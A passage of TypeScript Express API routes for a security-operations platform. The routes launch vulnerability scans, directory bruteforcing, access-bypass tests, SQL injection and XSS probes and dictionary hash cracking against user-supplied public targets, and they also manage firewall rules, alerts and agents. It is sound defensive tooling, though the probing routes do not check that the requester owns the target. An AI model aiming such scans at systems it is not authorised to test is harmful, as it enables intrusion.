        target,
        status: "running",
        executedBy: getUserId(req),
      });
      res.json({ id: scanRecord.id, status: "running" });
      try {
        const results = await scanVulnerabilities(target);
        await storage.updateScanResult(scanRecord.id, {
          status: "completed",
          results: JSON.stringify(results),
          findings: results.findings,
          severity: results.riskLevel,
          completedAt: new Date(),
        });
        if (results.findings > 0) {
          await storage.createSecurityEvent({
            organizationId: orgId,
            eventType: "anomaly",
            severity: results.riskLevel,
            source: "Vulnerability Scanner",
            description: `Vulnerability scan on ${target}: ${results.findings} issues found (Risk: ${results.riskLevel})`,
          });
        }
      } catch (err) {
        await storage.updateScanResult(scanRecord.id, { status: "failed", results: JSON.stringify({ error: (err as Error).message }) });
      }
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Scan failed" });
    }
  });

  app.post("/api/scan/remediate", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const userId = getUserId(req);
      const { actionType, target, details } = z.object({
        actionType: z.enum(["block_port", "block_path", "monitor_ssl", "info_header"]),
        target: z.string().min(1),
        details: z.record(z.any()),
      }).parse(req.body);

      let result: any = { success: false };

      switch (actionType) {
        case "block_port": {
          const port = details.port;
          const service = details.service || "Unknown";
          const rule = await storage.createFirewallRule({
            organizationId: orgId,
            ruleType: "port_block",
            value: String(port),
            action: "block",
            reason: `Dangerous port ${port} (${service}) found open on ${target} — blocked via scan remediation`,
            status: "active",
            createdBy: userId,
          });
          await storage.createAuditLog({
            organizationId: orgId,
            userId,
            action: "scan_remediate_block_port",
            targetType: "firewall_rule",
            targetId: String(rule.id),
            details: `Blocked port ${port} (${service}) found on ${target}`,
          });
          result = { success: true, type: "firewall_rule", ruleId: rule.id, message: `Port ${port} (${service}) blocked` };
          break;
        }
        case "block_path": {
          const path = details.path;
          const name = details.name || path;
          const alertRule = await storage.createAlertRule({
            organizationId: orgId,
            name: `Block access to ${name} on ${target}`,
            conditions: JSON.stringify({ path, target, type: "vuln_path_access" }),
            severity: details.severity || "high",
            actions: JSON.stringify(["notify", "block_source"]),
            enabled: true,
          });
          const fwRule = await storage.createFirewallRule({
            organizationId: orgId,
            ruleType: "domain_block",
            value: `${target}${path}`,
            action: "block",
            reason: `Vulnerable path ${path} (${name}) found accessible on ${target} — blocked via scan remediation`,
            status: "active",
            createdBy: userId,
          });
          await storage.createAuditLog({
            organizationId: orgId,
            userId,
            action: "scan_remediate_block_path",
            targetType: "alert_rule",
            targetId: String(alertRule.id),
            details: `Created alert rule and firewall rule for vulnerable path ${path} on ${target}`,
          });
          result = { success: true, type: "alert_rule_and_firewall", alertRuleId: alertRule.id, firewallRuleId: fwRule.id, message: `Path ${path} protected with alert rule and firewall rule` };
          break;
        }
        case "monitor_ssl": {
          const daysUntilExpiry = details.daysUntilExpiry;
          const alertRule = await storage.createAlertRule({
            organizationId: orgId,
            name: `SSL certificate expiry monitor for ${target}`,
            conditions: JSON.stringify({ target, type: "ssl_expiry", daysUntilExpiry }),
            severity: daysUntilExpiry <= 7 ? "critical" : daysUntilExpiry <= 30 ? "high" : "medium",
            actions: JSON.stringify(["notify"]),
            enabled: true,
          });
          await storage.createAuditLog({
            organizationId: orgId,
            userId,
            action: "scan_remediate_monitor_ssl",
            targetType: "alert_rule",
            targetId: String(alertRule.id),
            details: `Created SSL expiry monitoring alert for ${target} (${daysUntilExpiry} days remaining)`,
          });
          result = { success: true, type: "alert_rule", ruleId: alertRule.id, message: `SSL expiry monitoring enabled for ${target}` };
          break;
        }
        case "info_header": {
          result = { success: true, type: "info", message: "Header recommendation noted" };
          break;
        }
      }

      res.json(result);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Remediation failed" });
    }
  });

  app.get("/api/scan/history", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const results = await storage.getScanResults(orgId);
      res.json(results);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch scan history" });
    }
  });

  app.delete("/api/scan/history/:id", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const id = parseInt(req.params.id);
      if (isNaN(id)) return res.status(400).json({ error: "Invalid id" });
      const deleted = await storage.deleteScanResult(id, orgId);
      if (!deleted) return res.status(404).json({ error: "Scan not found or not yours" });
      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete scan" });
    }
  });

  app.post("/api/scan/history/delete-bulk", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { ids } = z.object({ ids: z.array(z.number()) }).parse(req.body);
      if (ids.length === 0) return res.json({ deleted: 0 });
      const deleted = await storage.deleteScanResults(ids, orgId);
      res.json({ deleted });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete scans" });
    }
  });

  app.post("/api/scan/subdomains", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { target } = z.object({ target: z.string().min(1) }).parse(req.body);
      const domain = target.replace(/^https?:\/\//, "").split(/[:/]/)[0];
      if (isPrivateTarget(domain)) {
        return res.status(400).json({ error: "Scanning private/internal addresses is not allowed" });
      }
      const scanRecord = await storage.createScanResult({
        organizationId: orgId,
        scanType: "subdomain_enum",
        target: domain,
        status: "running",
        executedBy: getUserId(req),
      });
      res.json({ id: scanRecord.id, status: "running" });
      try {
        const results = await enumerateSubdomains(domain);
        await storage.updateScanResult(scanRecord.id, {
          status: "completed",
          results: JSON.stringify(results),
          findings: results.totalFound,
          severity: results.totalFound > 20 ? "medium" : "info",
          completedAt: new Date(),
        });
      } catch (err) {
        await storage.updateScanResult(scanRecord.id, { status: "failed", results: JSON.stringify({ error: (err as Error).message }) });
      }
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Scan failed" });
    }
  });

  app.post("/api/scan/dirbrute", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { target } = z.object({ target: z.string().min(1) }).parse(req.body);
      const cleanTarget = target.replace(/^https?:\/\//, "").split(/[:/]/)[0];
      if (isPrivateTarget(cleanTarget)) {
        return res.status(400).json({ error: "Scanning private/internal addresses is not allowed" });
      }
      const scanRecord = await storage.createScanResult({
        organizationId: orgId,
        scanType: "dir_bruteforce",
        target,
        status: "running",
        executedBy: getUserId(req),
      });
      res.json({ id: scanRecord.id, status: "running" });
      try {
        const results = await bruteforceDirectories(target);
        const highSeverityCount = results.foundPaths.filter((p: any) => p.severity === "critical" || p.severity === "high").length;
        let severity = "info";
        if (results.foundPaths.some((p: any) => p.severity === "critical")) severity = "critical";
        else if (results.foundPaths.some((p: any) => p.severity === "high")) severity = "high";
        else if (results.foundPaths.some((p: any) => p.severity === "medium")) severity = "medium";
        await storage.updateScanResult(scanRecord.id, {
          status: "completed",
          results: JSON.stringify(results),
          findings: results.foundPaths.length,
          severity,
          completedAt: new Date(),
        });
        if (highSeverityCount > 0) {
          await storage.createSecurityEvent({
            organizationId: orgId,
            eventType: "reconnaissance",
            severity,
            source: "Directory Bruteforce",
            sourceIp: cleanTarget,
            description: `Directory bruteforce on ${target}: ${results.foundPaths.length} paths found (${highSeverityCount} high/critical severity)`,
          });
        }
      } catch (err) {
        await storage.updateScanResult(scanRecord.id, { status: "failed", results: JSON.stringify({ error: (err as Error).message }) });
      }
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Scan failed" });
    }
  });

  app.post("/api/scan/dir-fetch-content", async (req, res) => {
    try {
      const { target, paths } = z.object({
        target: z.string().min(1),
        paths: z.array(z.object({
          path: z.string(),
          category: z.string(),
          severity: z.string(),
          statusCode: z.number(),
          contentLength: z.number(),
          redirectUrl: z.string().nullable().optional(),
        })).max(200),
      }).parse(req.body);

      const cleanTarget = target.replace(/^https?:\/\//, "").split(/[:/]/)[0];
      if (isPrivateTarget(cleanTarget)) {
        return res.status(400).json({ error: "Scanning private/internal addresses is not allowed" });
      }

      const report = await fetchDiscoveredPaths(target, paths.map(p => ({
        ...p,
        redirectUrl: p.redirectUrl ?? null,
        contentLength: p.contentLength ?? 0,
      })));

      // Build a downloadable filename
      const hostname = cleanTarget.replace(/[^a-z0-9]/gi, "-");
      const ts = new Date().toISOString().slice(0, 10);
      const filename = `dir-content-${hostname}-${ts}.json`;

      res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
      res.setHeader("Content-Type", "application/json");
      return res.json(report);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Fetch failed" });
    }
  });

  app.post("/api/scan/bypass-test", async (req, res) => {
    try {
      const { target, path, originalStatusCode } = z.object({
        target: z.string().min(1),
        path: z.string().min(1),
        originalStatusCode: z.number().int(),
      }).parse(req.body);

      const cleanTarget = target.replace(/^https?:\/\//, "").split(/[:/]/)[0];
      if (isPrivateTarget(cleanTarget)) {
        return res.status(400).json({ error: "Scanning private/internal addresses is not allowed" });
      }

      const report = await testBypassTechniques(target, path, originalStatusCode);
      return res.json(report);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Bypass test failed" });
    }
  });

  app.post("/api/scan/techfp", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { target } = z.object({ target: z.string().min(1) }).parse(req.body);
      const cleanTarget = target.replace(/^https?:\/\//, "").split(/[:/]/)[0];
      if (isPrivateTarget(cleanTarget)) {
        return res.status(400).json({ error: "Scanning private/internal addresses is not allowed" });
      }
      const scanRecord = await storage.createScanResult({
        organizationId: orgId,
        scanType: "tech_fingerprint",
        target,
        status: "running",
        executedBy: getUserId(req),
      });
      res.json({ id: scanRecord.id, status: "running" });
      try {
        const results = await fingerprintTechnology(target);
        await storage.updateScanResult(scanRecord.id, {
          status: "completed",
          results: JSON.stringify(results),
          findings: results.technologies.length,
          severity: "info",
          completedAt: new Date(),
        });
      } catch (err) {
        await storage.updateScanResult(scanRecord.id, { status: "failed", results: JSON.stringify({ error: (err as Error).message }) });
      }
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Scan failed" });
    }
  });

  app.post("/api/scan/waf", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { target } = z.object({ target: z.string().min(1) }).parse(req.body);
      const cleanTarget = target.replace(/^https?:\/\//, "").split(/[:/]/)[0];
      if (isPrivateTarget(cleanTarget)) {
        return res.status(400).json({ error: "Scanning private/internal addresses is not allowed" });
      }
      const scanRecord = await storage.createScanResult({
        organizationId: orgId,
        scanType: "waf_detection",
        target,
        status: "running",
        executedBy: getUserId(req),
      });
      res.json({ id: scanRecord.id, status: "running" });
      try {
        const results = await detectWAF(target);
        await storage.updateScanResult(scanRecord.id, {
          status: "completed",
          results: JSON.stringify(results),
          findings: results.wafDetected ? 1 : 0,
          severity: results.wafDetected ? "info" : "medium",
          completedAt: new Date(),
        });
      } catch (err) {
        await storage.updateScanResult(scanRecord.id, { status: "failed", results: JSON.stringify({ error: (err as Error).message }) });
      }
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Scan failed" });
    }
  });

  app.post("/api/scan/whois", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { target } = z.object({ target: z.string().min(1) }).parse(req.body);
      const domain = target.replace(/^https?:\/\//, "").split(/[:/]/)[0];
      if (isPrivateTarget(domain)) {
        return res.status(400).json({ error: "Scanning private/internal addresses is not allowed" });
      }
      const scanRecord = await storage.createScanResult({
        organizationId: orgId,
        scanType: "whois_lookup",
        target: domain,
        status: "running",
        executedBy: getUserId(req),
      });
      res.json({ id: scanRecord.id, status: "running" });
      try {
        const results = await whoisLookup(domain);
        await storage.updateScanResult(scanRecord.id, {
          status: "completed",
          results: JSON.stringify(results),
          findings: 1,
          severity: "info",
          completedAt: new Date(),
        });
      } catch (err) {
        await storage.updateScanResult(scanRecord.id, { status: "failed", results: JSON.stringify({ error: (err as Error).message }) });
      }
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Scan failed" });
    }
  });

  app.post("/api/scan/sqli", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { target } = z.object({ target: z.string().min(1) }).parse(req.body);
      const cleanTarget = target.replace(/^https?:\/\//, "").split(/[:/]/)[0];
      if (isPrivateTarget(cleanTarget)) {
        return res.status(400).json({ error: "Scanning private/internal addresses is not allowed" });
      }
      const scanRecord = await storage.createScanResult({
        organizationId: orgId,
        scanType: "sqli_test",
        target,
        status: "running",
        executedBy: getUserId(req),
      });
      res.json({ id: scanRecord.id, status: "running" });
      try {
        const results = await testSQLInjection(target);
        const vulnCount = results.findings.length;
        let severity = "info";
        if (vulnCount > 0) {
          severity = results.findings.some((v: any) => v.severity === "critical") ? "critical" : "high";
        }
        await storage.updateScanResult(scanRecord.id, {
          status: "completed",
          results: JSON.stringify(results),
          findings: vulnCount,
          severity,
          completedAt: new Date(),
        });
        if (vulnCount > 0) {
          await storage.createSecurityEvent({
            organizationId: orgId,
            eventType: "vulnerability",
            severity,
            source: "SQL Injection Tester",
            sourceIp: cleanTarget,
            description: `SQL Injection test on ${target}: ${vulnCount} potential vulnerability/ies detected (Risk: ${results.riskLevel})`,
            status: "new",
          });
        }
      } catch (err) {
        await storage.updateScanResult(scanRecord.id, { status: "failed", results: JSON.stringify({ error: (err as Error).message }) });
      }
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Scan failed" });
    }
  });

  app.post("/api/scan/xss", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { target } = z.object({ target: z.string().min(1) }).parse(req.body);
      const cleanTarget = target.replace(/^https?:\/\//, "").split(/[:/]/)[0];
      if (isPrivateTarget(cleanTarget)) {
        return res.status(400).json({ error: "Scanning private/internal addresses is not allowed" });
      }
      const scanRecord = await storage.createScanResult({
        organizationId: orgId,
        scanType: "xss_test",
        target,
        status: "running",
        executedBy: getUserId(req),
      });
      res.json({ id: scanRecord.id, status: "running" });
      try {
        const results = await testXSS(target);
        const vulnCount = results.findings.length;
        let severity = "info";
        if (vulnCount > 0) {
          severity = results.findings.some((v: any) => v.severity === "critical") ? "critical" : "high";
        }
        await storage.updateScanResult(scanRecord.id, {
          status: "completed",
          results: JSON.stringify(results),
          findings: vulnCount,
          severity,
          completedAt: new Date(),
        });
        if (vulnCount > 0) {
          await storage.createSecurityEvent({
            organizationId: orgId,
            eventType: "vulnerability",
            severity,
            source: "XSS Tester",
            sourceIp: cleanTarget,
            description: `XSS test on ${target}: ${vulnCount} potential vulnerability/ies detected (Risk: ${results.riskLevel})`,
            status: "new",
          });
        }
      } catch (err) {
        await storage.updateScanResult(scanRecord.id, { status: "failed", results: JSON.stringify({ error: (err as Error).message }) });
      }
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Scan failed" });
    }
  });

  app.post("/api/scan/hash-id", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { hash } = z.object({ hash: z.string().min(1) }).parse(req.body);
      const scanRecord = await storage.createScanResult({
        organizationId: orgId,
        scanType: "hash_identify",
        target: hash.substring(0, 64),
        status: "running",
        executedBy: getUserId(req),
      });
      try {
        const results = identifyHash(hash);
        await storage.updateScanResult(scanRecord.id, {
          status: "completed",
          results: JSON.stringify(results),
          findings: results.possibleTypes.length,
          severity: "info",
          completedAt: new Date(),
        });
        res.json({ id: scanRecord.id, ...results });
      } catch (err) {
        await storage.updateScanResult(scanRecord.id, { status: "failed", results: JSON.stringify({ error: (err as Error).message }) });
        res.status(500).json({ error: "Hash identification failed" });
      }
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Hash identification failed" });
    }
  });

  app.post("/api/scan/hash-crack", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { hash, hashType } = z.object({
        hash: z.string().min(1),
        hashType: z.string().optional(),
      }).parse(req.body);
      const scanRecord = await storage.createScanResult({
        organizationId: orgId,
        scanType: "hash_crack",
        target: hash.substring(0, 64),
        status: "running",
        executedBy: getUserId(req),
      });
      try {
        const results = crackHash(hash, hashType);
        const severity = results.cracked ? "critical" : "info";
        await storage.updateScanResult(scanRecord.id, {
          status: "completed",
          results: JSON.stringify(results),
          findings: results.cracked ? 1 : 0,
          severity,
          completedAt: new Date(),
        });
        if (results.cracked) {
          await storage.createSecurityEvent({
            organizationId: orgId,
            eventType: "vulnerability",
            severity: "critical",
            source: "Hash Cracker",
            description: `Hash successfully cracked using dictionary attack (${results.hashType} hash). This indicates a weak password is in use.`,
            status: "new",
          });
        }
        res.json({ id: scanRecord.id, ...results });
      } catch (err) {
        await storage.updateScanResult(scanRecord.id, { status: "failed", results: JSON.stringify({ error: (err as Error).message }) });
        res.status(500).json({ error: "Hash cracking failed" });
      }
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Hash cracking failed" });
    }
  });

  app.post("/api/scan/password-analyze", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { password } = z.object({ password: z.string().min(1) }).parse(req.body);
      const scanRecord = await storage.createScanResult({
        organizationId: orgId,
        scanType: "password_analyze",
        target: "password-analysis",
        status: "running",
        executedBy: getUserId(req),
      });
      try {
        const results = analyzePassword(password);
        const severity = results.score <= 20 ? "critical" : results.score <= 40 ? "high" : results.score <= 60 ? "medium" : "info";
        await storage.updateScanResult(scanRecord.id, {
          status: "completed",
          results: JSON.stringify(results),
          findings: results.weaknesses.length,
          severity,
          completedAt: new Date(),
        });
        res.json({ id: scanRecord.id, ...results });
      } catch (err) {
        await storage.updateScanResult(scanRecord.id, { status: "failed", results: JSON.stringify({ error: (err as Error).message }) });
        res.status(500).json({ error: "Password analysis failed" });
      }
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Password analysis failed" });
    }
  });

  app.get("/api/settings/retention", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const org = await storage.getOrganization(orgId);
      if (!org) return res.status(404).json({ error: "Organization not found" });
      res.json({
        logRetentionDays: org.logRetentionDays,
        auditRetentionDays: org.auditRetentionDays,
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch retention settings" });
    }
  });

  app.patch("/api/settings/retention", requireRole("admin"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { logRetentionDays, auditRetentionDays } = z.object({
        logRetentionDays: z.number().int().min(7).max(3650),
        auditRetentionDays: z.number().int().min(30).max(3650),
      }).parse(req.body);
      await storage.updateOrganization(orgId, { logRetentionDays, auditRetentionDays } as any);
      await storage.createAuditLog({
        organizationId: orgId,
        userId: getUserId(req),
        action: "update_retention_policy",
        targetType: "organization",
        targetId: String(orgId),
        details: `Retention policy updated: logs=${logRetentionDays}d, audit=${auditRetentionDays}d`,
      });
      res.json({ logRetentionDays, auditRetentionDays });
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to update retention settings" });
    }
  });

  app.post("/api/settings/retention/run-now", requireRole("admin"), async (req, res) => {
    try {
      const { runDataRetention } = await import("./dataRetention");
      const stats = await runDataRetention();
      res.json({ success: true, stats });
    } catch (error) {
      res.status(500).json({ error: "Failed to run cleanup" });
    }
  });

  app.get("/api/settings/defense-mode", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const org = await storage.getOrganization(orgId);
      res.json({ defenseMode: (org as any)?.defenseMode || "auto" });
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch defense mode" });
    }
  });

  app.patch("/api/settings/defense-mode", requireRole("admin"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { defenseMode } = z.object({
        defenseMode: z.enum(["auto", "semi-auto", "manual"]),
      }).parse(req.body);
      await storage.updateOrganization(orgId, { defenseMode } as any);
      await storage.createAuditLog({
        organizationId: orgId,
        userId: getUserId(req),
        action: "update_defense_mode",
        targetType: "organization",
        targetId: String(orgId),
        details: `Defense mode changed to: ${defenseMode}`,
      });
      res.json({ defenseMode });
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to update defense mode" });
    }
  });

  app.get("/api/settings/notification-channels", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const channels = await storage.getNotificationChannels(orgId);
      res.json(channels);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch notification channels" });
    }
  });

  app.post("/api/settings/notification-channels", requireRole("admin"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const data = z.object({
        name: z.string().min(1).max(100),
        type: z.enum(["webhook", "email"]),
        config: z.record(z.any()),
        enabled: z.boolean().optional().default(true),
      }).parse(req.body);

      const channel = await storage.createNotificationChannel({
        organizationId: orgId,
        name: data.name,
        type: data.type,
        config: data.config,
        enabled: data.enabled,
      });

      await storage.createAuditLog({
        organizationId: orgId,
        userId: getUserId(req),
        action: "create_notification_channel",
        targetType: "notification_channel",
        targetId: String(channel.id),
        details: `Created ${data.type} notification channel: ${data.name}`,
      });

      res.status(201).json(channel);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to create notification channel" });
    }
  });

  app.patch("/api/settings/notification-channels/:id", requireRole("admin"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const id = parseInt(req.params.id);
      const data = z.object({
        enabled: z.boolean().optional(),
        config: z.record(z.any()).optional(),
      }).parse(req.body);

      const updated = await storage.updateNotificationChannel(id, orgId, data);
      if (!updated) return res.status(404).json({ error: "Channel not found" });
      res.json(updated);
    } catch (error) {
      if (error instanceof z.ZodError) return res.status(400).json({ error: error.errors });
      res.status(500).json({ error: "Failed to update notification channel" });
    }
  });

  app.delete("/api/settings/notification-channels/:id", requireRole("admin"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const id = parseInt(req.params.id);
      const deleted = await storage.deleteNotificationChannel(id, orgId);
      if (!deleted) return res.status(404).json({ error: "Channel not found" });

      await storage.createAuditLog({
        organizationId: orgId,
        userId: getUserId(req),
        action: "delete_notification_channel",
        targetType: "notification_channel",
        targetId: String(id),
        details: `Deleted notification channel`,
      });

      res.json({ success: true });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete notification channel" });
    }
  });

  app.post("/api/settings/notification-channels/:id/test", requireRole("admin"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const id = parseInt(req.params.id);
      const channels = await storage.getNotificationChannels(orgId);
      const channel = channels.find((c) => c.id === id);
      if (!channel) return res.status(404).json({ error: "Channel not found" });

      const result = await testChannel(channel);
      if (result.success) {
        await storage.updateNotificationChannel(id, orgId, { lastUsed: new Date() });
      }
      res.json(result);
    } catch (error) {
      res.status(500).json({ error: "Failed to test notification channel" });
    }
  });

  app.get("/api/simulate/scenarios", async (_req, res) => {
    const scenarios = Object.entries(SCENARIOS).map(([id, s]) => ({
      id,
      name: s.name,
      description: s.description,
      mitre: s.mitre,
    }));
    res.json(scenarios);
  });

  app.post("/api/simulate/:scenario", requireRole("admin"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const { scenario } = req.params;
      const scenarioConfig = SCENARIOS[scenario];
      if (!scenarioConfig) {
        return res.status(404).json({ error: "Scenario not found" });
      }
      res.json({ status: "running", scenario: scenarioConfig.name });
      try {
        const result = await scenarioConfig.fn(orgId);
        await storage.createAuditLog({
          organizationId: orgId,
          userId: getUserId(req),
          action: "run_simulation",
          targetType: "simulation",
          targetId: scenario,
          details: result.description,
        });
        broadcast({ type: "simulation_complete", scenario, ...result, orgId });
      } catch (err) {
        console.error("Simulation error:", err);
      }
    } catch (error) {
      res.status(500).json({ error: "Simulation failed" });
    }
  });

  app.get("/api/protection/status", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const org = await storage.getOrganization(orgId);
      const defenseMode = (org as any)?.defenseMode || "manual";

      const firewallRulesAll = await storage.getFirewallRules(orgId);
      const activeFirewallRules = firewallRulesAll.filter(r => r.status === "active").length;

      const alertRulesAll = await storage.getAlertRules(orgId);
      const activeAlertRules = alertRulesAll.filter(r => r.enabled).length;

      const policiesAll = await storage.getSecurityPolicies(orgId);
      const activePolicies = policiesAll.filter(p => p.enabled).length;

      const events = await storage.getSecurityEvents(orgId);
      const unresolvedAlerts = events.filter(e => e.status === "new" || e.status === "investigating").length;
      const openThreats = events.filter(e =>
        (e.status === "new" || e.status === "investigating") &&
        (e.severity === "critical" || e.severity === "high")
      ).length;

      const scanResults = await storage.getScanResults(orgId);
      const lastScan = scanResults.length > 0 ? scanResults[0].createdAt : null;

      const allAgents = await storage.getAgentsByOrg(orgId);
      const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
      const onlineAgents = allAgents.filter(a => a.status === "online" && a.lastSeen && new Date(a.lastSeen) > fiveMinutesAgo);
      const monitoringAgents = onlineAgents.filter(a => {
        const telemetry = a.telemetry as any;
        return telemetry?.monitoringEnabled === true;
      });

      const agentCommands = [];
      for (const agent of allAgents) {
        const cmds = await storage.getCommandsByAgent(agent.id);
        const protectionCmds = cmds.filter(c =>
          c.command === "security_scan" || c.command === "enable_monitoring" || c.command === "honeypot_monitor"
        );
        if (protectionCmds.length > 0) {
          const latestCmd = protectionCmds[0];
          agentCommands.push({
            agentId: agent.id,
            hostname: agent.hostname,
            status: agent.status,
            lastCommand: latestCmd.command,
            commandStatus: latestCmd.status,
            commandTime: latestCmd.createdAt,
          });
        }
      }

      let score = 0;
      if (defenseMode === "auto") score += 20;
      else if (defenseMode === "semi-auto") score += 8;

      if (activeFirewallRules > 0) score += Math.min(15, activeFirewallRules * 4);
      if (activeAlertRules > 0) score += Math.min(15, activeAlertRules * 4);
      if (activePolicies > 0) score += Math.min(15, activePolicies * 5);
      if (lastScan) score += 10;
      if (unresolvedAlerts === 0) score += 10;
      else score += Math.max(0, 10 - Math.min(10, unresolvedAlerts));

      if (onlineAgents.length > 0) score += 5;
      if (monitoringAgents.length > 0) score += Math.min(10, monitoringAgents.length * 5);

      score = Math.min(100, Math.max(0, score));

      let level: "protected" | "issues" | "at_risk" = "at_risk";
      if (score >= 80) level = "protected";
      else if (score >= 50) level = "issues";

      res.json({
        score,
        level,
        defenseMode,
        activeFirewallRules,
        totalFirewallRules: firewallRulesAll.length,
        activeAlertRules,
        totalAlertRules: alertRulesAll.length,
        activePolicies,
        totalPolicies: policiesAll.length,
        unresolvedAlerts,
        lastScanDate: lastScan,
        openThreats,
        totalAgents: allAgents.length,
        onlineAgents: onlineAgents.length,
        monitoringAgents: monitoringAgents.length,
        agentDeployments: agentCommands,
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch protection status" });
    }
  });

  app.post("/api/protection/activate", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const userId = getUserId(req);

      await storage.updateOrganization(orgId, { defenseMode: "auto" } as any);

      const policies = await storage.getSecurityPolicies(orgId);
      let policiesActivated = 0;
      for (const policy of policies) {
        if (!policy.enabled) {
          await storage.updateSecurityPolicy(policy.id, orgId, { enabled: true });
          policiesActivated++;
        }
      }

      const rules = await storage.getAlertRules(orgId);
      let alertRulesActivated = 0;
      for (const rule of rules) {
        if (!rule.enabled) {
          await storage.updateAlertRule(rule.id, orgId, { enabled: true });
          alertRulesActivated++;
        }
      }

      const agents = await storage.getAgentsByOrg(orgId);
      const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
      const onlineAgents = agents.filter(a => a.status === "online" && a.lastSeen && new Date(a.lastSeen) > fiveMinutesAgo);
      let agentCommandsSent = 0;

      for (const agent of onlineAgents) {
        await storage.createCommand({
          agentId: agent.id,
          command: "security_scan",
          params: JSON.stringify({ source: "auto_protect" }),
          status: "pending",
        });
        await storage.createCommand({
          agentId: agent.id,
          command: "honeypot_monitor",
          params: JSON.stringify({ ports: "23,445,1433,3389,5900,8080", duration: 300, source: "auto_protect" }),
          status: "pending",
        });
        await storage.createCommand({
          agentId: agent.id,
          command: "enable_monitoring",
          params: JSON.stringify({ source: "auto_protect" }),
          status: "pending",
        });
        agentCommandsSent += 3;
      }

      await storage.createAuditLog({
        organizationId: orgId,
        userId,
        action: "activate_full_protection",
        targetType: "organization",
        targetId: String(orgId),
        details: `Full protection activated: defense=auto, ${policiesActivated} policies enabled, ${alertRulesActivated} alert rules enabled, ${agentCommandsSent} commands sent to ${onlineAgents.length} agent(s)`,
      });

      res.json({
        defenseModeSet: true,
        policiesActivated,
        alertRulesActivated,
        scansStarted: 0,
        agentsDeployed: onlineAgents.length,
        agentCommandsSent,
      });
    } catch (error) {
      res.status(500).json({ error: "Failed to activate protection" });
    }
  });

  app.post("/api/protection/resolve-all", async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const events = await storage.getSecurityEvents(orgId);
      const unresolved = events.filter(e =>
        (e.status === "new" || e.status === "investigating") &&
        (e.severity === "critical" || e.severity === "high")
      );

      let resolved = 0;
      for (const event of unresolved) {
        await storage.updateSecurityEventStatus(event.id, orgId, "resolved");
        resolved++;
      }

      await storage.createAuditLog({
        organizationId: orgId,
        userId: getUserId(req),
        action: "resolve_all_threats",
        targetType: "security_event",
        targetId: "bulk",
        details: `Resolved ${resolved} open threats via Protection Center`,
      });

      res.json({ resolved });
    } catch (error) {
      res.status(500).json({ error: "Failed to resolve threats" });
    }
  });

  app.post("/api/protection/deploy-agents", requireRole("admin"), async (req, res) => {
    try {
      const orgId = getOrgId(req);
      const userId = getUserId(req);

      const allAgents = await storage.getAgentsByOrg(orgId);
      const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
